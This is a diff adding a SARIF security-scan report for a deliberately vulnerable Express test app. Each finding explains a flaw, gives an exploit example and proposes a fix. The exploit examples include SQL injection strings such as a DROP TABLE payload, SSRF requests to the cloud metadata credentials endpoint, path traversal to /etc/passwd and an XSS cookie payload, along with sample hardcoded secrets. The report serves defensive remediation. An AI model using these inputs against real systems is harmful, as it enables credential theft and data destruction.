+                    {
+                      "deletedRegion": {
+                        "startLine": 35
+                      },
+                      "insertedContent": {
+                        "text": "const JWT_SECRET = process.env.JWT_SECRET;"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-023"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application is using `DB_PASSWORD` for a database connection, which has been identified as a hardcoded secret (see Finding 2). Using a hardcoded credential directly in the database connection configuration means the application relies on an insecurely stored secret for its critical database access.\n\nExploit: The hardcoded `DB_PASSWORD` (`SuperSecretPassword123`) is directly used to establish a connection to the `users` database as the `root` user. Any attacker who compromises the source code or runtime environment can easily retrieve this password and use it to connect to the database, leading to full data compromise (exfiltration, modification, deletion).\n\nFix: Ensure that `DB_PASSWORD` is loaded from a secure source like an environment variable or a secret management service, rather than being hardcoded. This prevents the credential from being embedded in the source code. It's also good practice to externalize other sensitive connection parameters like host, user, and database name using environment variables for greater flexibility and security."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 49
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-024"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The `/config` API endpoint explicitly exposes `API_KEY` and `DB_PASSWORD` in its JSON response. Both of these variables are identified as hardcoded sensitive secrets (see Findings 1 and 2). This means that any client or attacker who accesses this endpoint can retrieve these critical credentials directly, leading to severe compromise.\n\nExploit: Any user, authenticated or unauthenticated (depending on the application's routing and middleware setup, which is not provided), can make a GET request to `/config`. The application will respond with a JSON object containing `apiKey: 'sk_test_123456789abcdef'` and `password: 'SuperSecretPassword123'`, directly leaking both the Stripe API key and the database password to the requestor.\n\nFix: Remove the exposure of all sensitive secrets (like `API_KEY` and `DB_PASSWORD`) from public API endpoints. Configuration endpoints should only return non-sensitive, client-facing parameters. Secrets must never be sent to the client, even if they are 'test' keys, as this creates a dangerous pattern and increases the risk of accidental exposure of production credentials."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 105
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Remove the exposure of all sensitive secrets (like `API_KEY` and `DB_PASSWORD`) from public API endpoints. Configuration endpoints should only return non-sensitive, client-facing parameters. Secrets must never be sent to the client, even if they are 'test' keys, as this creates a dangerous pattern and increases the risk of accidental exposure of production credentials."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 105
+                      },
+                      "insertedContent": {
+                        "text": "app.get('/config', (req, res) => {\n  // Only expose non-sensitive configuration, if any.\n  res.json({\n    message: 'Configuration endpoint accessible, but sensitive keys are not exposed.'\n  })\n})"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-025"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application exposes sensitive information, specifically an `apiKey` and `DB_PASSWORD`, via the `/config` API endpoint. An attacker could access this endpoint to retrieve these credentials, leading to unauthorized API usage and potential database compromise. Even if `API_KEY` and `DB_PASSWORD` are loaded from environment variables, directly returning them in a JSON response to a client-facing endpoint is a severe information leak.\n\nExploit: An attacker could make a GET request to `http://example.com/config` (or the application's actual URL) and receive a JSON response containing the `apiKey` and `DB_PASSWORD`, which they can then use to access other systems or the database directly.\n\nFix: The sensitive `apiKey` and `DB_PASSWORD` fields are removed from the JSON response. Sensitive credentials should never be directly exposed to clients via API endpoints. Configuration should be managed securely on the server side."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 106
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-026"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The database password (`DB_PASSWORD`) is directly hard-coded in the application's source code for establishing a database connection. This is a severe security risk because if the source code repository or the application bundle is ever compromised, the database credentials will be immediately available to an attacker, leading to full database compromise.\n\nExploit: An attacker who gains access to the application's source code (e.g., via a misconfigured Git repository, CI/CD pipeline, or filesystem access on the server) can extract the `DB_PASSWORD` and use it to connect to the database directly, performing data exfiltration, modification, or deletion.\n\nFix: Database credentials should never be hard-coded. They must be loaded securely from environment variables, a secrets management service, or a configuration file that is not committed to version control. This prevents direct exposure of credentials in the codebase."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 234
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Database credentials should never be hard-coded. They must be loaded securely from environment variables, a secrets management service, or a configuration file that is not committed to version control. This prevents direct exposure of credentials in the codebase."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 234
+                      },
+                      "insertedContent": {
+                        "text": "const db = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: process.env.DB_PASSWORD, // Load from environment variable\n    database: 'users'\n  })"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-027"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_jwt_hardcoded_secret",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application uses a hard-coded, weak secret (`'secret'`) to sign JSON Web Tokens (JWTs). This makes the tokens highly vulnerable to brute-force attacks or dictionary attacks, allowing an attacker to discover the secret. Once the secret is known, an attacker can forge arbitrary valid JWTs for any user, thereby bypassing authentication and impersonating users. The absence of an `expiresIn` option further means tokens, once compromised, remain valid indefinitely.\n\nExploit: An attacker can attempt to crack the hard-coded secret `'secret'` using tools like `hashcat` or online JWT cracking services. Once discovered, they can craft a new JWT payload (e.g., `{ userId: 1, username: 'admin' }`) and sign it with the known secret. This forged token can then be used to authenticate as the 'admin' user or any other desired user.\n\nFix: JWT secrets must be strong, randomly generated, and stored securely (e.g., in environment variables or a secrets management service), never hard-coded in the codebase. Additionally, JWTs should always have an expiration time to limit the window of opportunity for attackers if a token is compromised."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 118
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "JWT secrets must be strong, randomly generated, and stored securely (e.g., in environment variables or a secrets management service), never hard-coded in the codebase. Additionally, JWTs should always have an expiration time to limit the window of opportunity for attackers if a token is compromised."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 118
+                      },
+                      "insertedContent": {
+                        "text": "const token = jwt.sign(\n    { userId: 1, username },\n    process.env.JWT_SECRET, // Load from environment variable\n    { expiresIn: '1h' }     // Add an expiration time\n  )"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-028"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_sql_injection",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application constructs a SQL query by directly concatenating user-controlled input (`input`) into the query string without any form of sanitization, validation, or parameterization. This makes the application vulnerable to SQL injection, allowing an attacker to manipulate the query to gain unauthorized access to data, modify database records, or even execute arbitrary commands on the underlying database system.\n\nExploit: If an attacker provides `input` as `1 OR 1=1`, the query becomes `SELECT * FROM users WHERE id = 1 OR 1=1`, returning all user records. More maliciously, `1; DROP TABLE users;` could delete the `users` table if the database user has sufficient permissions. Other attacks can include data exfiltration using union-based injections.\n\nFix: SQL queries involving user input must always use parameterized queries or prepared statements. This separates the query structure from the user-provided data, preventing malicious input from altering the query logic, effectively eliminating SQL injection vulnerabilities."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/services/userService.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 13
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "SQL queries involving user input must always use parameterized queries or prepared statements. This separates the query structure from the user-provided data, preventing malicious input from altering the query logic, effectively eliminating SQL injection vulnerabilities."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/services/userService.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 13
+                      },
+                      "insertedContent": {
+                        "text": "db.query(\n    \"SELECT * FROM users WHERE id = ?\", // Use a placeholder\n    [input] // Pass input as an array of parameters\n  )"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-029"
+          }
+        },
+        {
+          "ruleId": "javascript_express_server_side_request_forgery",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application accepts a URL directly from user input (`req.query.url`) and then makes an HTTP request to that URL using `axios.get()`. This is a Server-Side Request Forgery (SSRF) vulnerability. An attacker can supply internal or local network URLs (e.g., `http://localhost`, `http://169.254.169.254` for AWS metadata, or internal IP addresses) to force the server to make requests to those locations. This can be used to scan internal networks, access sensitive internal services, bypass firewalls, or exploit trust relationships between the server and other internal systems.\n\nExploit: An attacker could provide `url=http://localhost:8080/admin` to try and access an internal admin interface, or `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` to fetch AWS credentials (if hosted on EC2). The response data is then sent back to the attacker, providing them with sensitive information or access.\n\nFix: User-provided URLs for server-side requests must be rigorously validated. This fix implements a basic whitelist check, only allowing requests to specific, trusted domains. A robust solution should also parse the URL object to prevent IP-based access to internal resources, enforce allowed protocols (e.g., HTTP/HTTPS only), and handle redirects securely."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 181
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-030"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_http_url_using_user_input",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application uses user-controlled input (`req.body.url`) directly as the target URL for an `axios.post` request. An attacker can provide an arbitrary URL, forcing the server to make requests to internal network resources, cloud metadata APIs (e.g., AWS EC2 metadata service), or other external services, potentially leading to information disclosure, port scanning, or further attacks.\n\nExploit: An attacker sends a POST request to `/webhook` with a body like `{\"url\": \"http://localhost/admin\"}` or `{\"url\": \"http://169.254.169.254/latest/meta-data/\"}`. The server will then attempt to access these internal or sensitive endpoints.\n\nFix: Validate the `webhookUrl` by parsing it and applying strict checks. At a minimum, enforce allowed protocols (HTTP/HTTPS) and prevent requests to private IP ranges (`127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) or `localhost`. A more robust solution would involve maintaining an allow-list of trusted domains the server is permitted to communicate with."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 188
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-031"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_non_literal_fs_filename",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application constructs a file path using unsanitized user input (`req.query.file`) and passes it directly to `fs.readFile`. An attacker can inject path traversal sequences (e.g., `../`) to read arbitrary files outside the intended directory, potentially accessing sensitive configuration files, source code, or credential files.\n\nExploit: An attacker sends a GET request to `/read?file=../../../../etc/passwd`. The server will attempt to read the `/etc/passwd` file (on Linux/Unix systems) and return its content, disclosing system user information.\n\nFix: Sanitize the user-provided filename by resolving it against a predefined base directory using `path.join` and `path.resolve`. Crucially, verify that the resulting absolute path remains strictly within the allowed base directory using a `startsWith` check. This prevents path traversal attacks by ensuring that no `../` sequences can navigate outside the intended file access scope."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 92
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-032"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_raw_html_using_user_input",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] The application embeds unsanitized user input (`req.query.q`) directly into the HTML response without any encoding. This creates a reflected Cross-Site Scripting (XSS) vulnerability, allowing an attacker to inject arbitrary HTML or JavaScript code into the victim's browser, which will then be executed in the context of the application's domain.\n\nExploit: An attacker sends a crafted URL like `/search?q=<script>alert(document.cookie)</script>` to a victim. When the victim opens the URL, the injected script executes, displaying an alert box with their cookies (or performing more malicious actions like session hijacking, defacement, or redirecting to phishing sites).\n\nFix: Escape all HTML special characters in user-controlled input (`req.query.q`) before embedding it into the HTML response. This prevents the browser from interpreting the input as active content (like `<script>` tags, event handlers, etc.) and mitigates Cross-Site Scripting (XSS) attacks. Using an existing, well-vetted HTML escaping library is recommended for comprehensive protection."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 81
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Escape all HTML special characters in user-controlled input (`req.query.q`) before embedding it into the HTML response. This prevents the browser from interpreting the input as active content (like `<script>` tags, event handlers, etc.) and mitigates Cross-Site Scripting (XSS) attacks. Using an existing, well-vetted HTML escaping library is recommended for comprehensive protection."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 81
+                      },
+                      "insertedContent": {
+                        "text": "// A simple HTML escaping utility function (can be imported from a library like 'lodash.escape' or 'xss')\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#039;\");\n}\n\n// ...\n\napp.get('/search', (req, res) => {\n  const query = req.query.q;\n  const sanitizedQuery = escapeHtml(query || ''); // Ensure query is a string and escape it\n  res.send('<h1>' + sanitizedQuery + '</h1>');\n})"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-033"
+          }
+        },
+        {
+          "ruleId": "javascript_express_helmet_missing",
+          "level": "warning",
+          "message": {
+            "text": "[MEDIUM] The application does not use Helmet.js middleware, which is an essential package for Express applications that sets various security-enhancing HTTP headers. Without Helmet, the application lacks protections against common client-side attacks such as Cross-Site Scripting (XSS) via missing Content Security Policy, clickjacking via missing X-Frame-Options, MIME-type sniffing via missing X-Content-Type-Options, and more.\n\nExploit: Without `X-Frame-Options`, an attacker could embed the application within an iframe on a malicious site and attempt clickjacking attacks, tricking users into clicking on hidden elements. Without a `Content-Security-Policy`, even if HTML escaping is applied, other forms of XSS (e.g., through insecure third-party scripts) become easier.\n\nFix: Add the `helmet` middleware (`app.use(helmet())`) to the Express application after initializing `app` but before defining routes. Helmet automatically sets several HTTP response headers that enhance the application's security posture against various web vulnerabilities, including XSS, clickjacking, and other common client-side attacks, by enforcing browser security policies."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 24
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Add the `helmet` middleware (`app.use(helmet())`) to the Express application after initializing `app` but before defining routes. Helmet automatically sets several HTTP response headers that enhance the application's security posture against various web vulnerabilities, including XSS, clickjacking, and other common client-side attacks, by enforcing browser security policies."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 24
+                      },
+                      "insertedContent": {
+                        "text": "const helmet = require('helmet') // Add this line\n\nconst app = express()\napp.use(helmet()) // Add this line before other middleware to apply security headers\napp.use(express.json())\napp.use(express.urlencoded({ extended: true }))"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-034"
+          }
+        },
+        {
+          "ruleId": "javascript_express_reduce_fingerprint",
+          "level": "note",
+          "message": {
+            "text": "[LOW] The Express application, by default, sends the `X-Powered-By: Express` header in its HTTP responses. This header reveals information about the server's technology stack, which can assist attackers in fingerprinting the application and targeting known vulnerabilities specific to Express or Node.js versions. While not a direct vulnerability, it provides useful reconnaissance information to potential attackers.\n\nExploit: An attacker can use network inspection tools (e.g., `curl -I <your-app-url>`) to observe the `X-Powered-By: Express` header in the HTTP response. Knowing the server technology allows them to search for publicly known exploits or vulnerabilities specific to that technology and version, narrowing down their attack vectors.\n\nFix: Disable the `X-Powered-By` header by adding `app.disable('x-powered-by')` after initializing the Express app. This removes unnecessary server technology information from HTTP responses, making it slightly harder for attackers to fingerprint the application and identify potential targets for known exploits."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 24
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Disable the `X-Powered-By` header by adding `app.disable('x-powered-by')` after initializing the Express app. This removes unnecessary server technology information from HTTP responses, making it slightly harder for attackers to fingerprint the application and identify potential targets for known exploits."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 24
+                      },
+                      "insertedContent": {
+                        "text": "const app = express()\napp.disable('x-powered-by') // Add this line immediately after app initialization\napp.use(express.json())\napp.use(express.urlencoded({ extended: true }))"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-035"
+          }
+        },
+        {
+          "ruleId": "javascript_lang_observable_timing",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application compares a user-supplied token (`req.body.token`) with a sensitive API token (`process.env.API_TOKEN`) using the standard JavaScript strict equality operator (`===`). This operator is not guaranteed to perform comparisons in constant time across all JavaScript engines and environments. An attacker could potentially perform a timing attack by sending various token prefixes and observing slight differences in response times. These timing discrepancies can reveal how many characters of the provided token match the sensitive stored token, allowing the attacker to progressively guess the full API token character by character.\n\nExploit: An attacker sends a series of requests to the `/verify` endpoint with different initial characters for the `token` parameter (e.g., `token: 'a...'`, `token: 'b...'`, `token: 'c...'`). By precisely measuring the response time for each request, they might observe that a request starting with 'x' takes slightly longer than others. This indicates that 'x' is the first character of the `API_TOKEN`. The attacker then repeats this process with `token: 'xa...'`, `token: 'xb...'`, and so on, gradually reconstructing the entire secret token. Once the token is reconstructed, the attacker gains unauthorized access to resources protected by this API token.\n\nFix: The `crypto.timingSafeEqual` function from Node.js's built-in `crypto` module is used to perform a constant-time comparison of the tokens. This means the function takes the same amount of time to execute regardless of how many characters match or where the first mismatch occurs, thereby eliminating the timing side-channel vulnerability. The `crypto` module should be imported once at the top of the file (e.g., `const crypto = require('crypto');`). Additionally, a check is added to ensure both tokens are valid strings and of the same length before conversion to Buffers, as length differences could themselves be a timing leak. If any of these conditions are not met, `isValid` defaults to `false` to prevent errors and maintain security."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 204
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "The `crypto.timingSafeEqual` function from Node.js's built-in `crypto` module is used to perform a constant-time comparison of the tokens. This means the function takes the same amount of time to execute regardless of how many characters match or where the first mismatch occurs, thereby eliminating the timing side-channel vulnerability. The `crypto` module should be imported once at the top of the file (e.g., `const crypto = require('crypto');`). Additionally, a check is added to ensure both tokens are valid strings and of the same length before conversion to Buffers, as length differences could themselves be a timing leak. If any of these conditions are not met, `isValid` defaults to `false` to prevent errors and maintain security."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/test-vuln-2.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 204
+                      },
+                      "insertedContent": {
+                        "text": "  // The 'crypto' module must be required at the top of the file (e.g., const crypto = require('crypto');).\n  // Perform a constant-time comparison to prevent timing attacks.\n  // It's crucial to ensure both inputs are strings of equal length\n  // before converting to Buffers for timingSafeEqual, as length differences\n  // could also be a timing side-channel.\n  const isValid = (token && storedToken && typeof token === 'string' && typeof storedToken === 'string' && token.length === storedToken.length)\n                  ? crypto.timingSafeEqual(Buffer.from(token), Buffer.from(storedToken))\n                  : false;\n\n  if (isValid) {\n    res.json({ valid: true });\n  } else {\n    res.json({ valid: false });\n  }"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 60,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Bearer"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-036"
+          }
+        }
+      ]
+    }
+  ]
+}
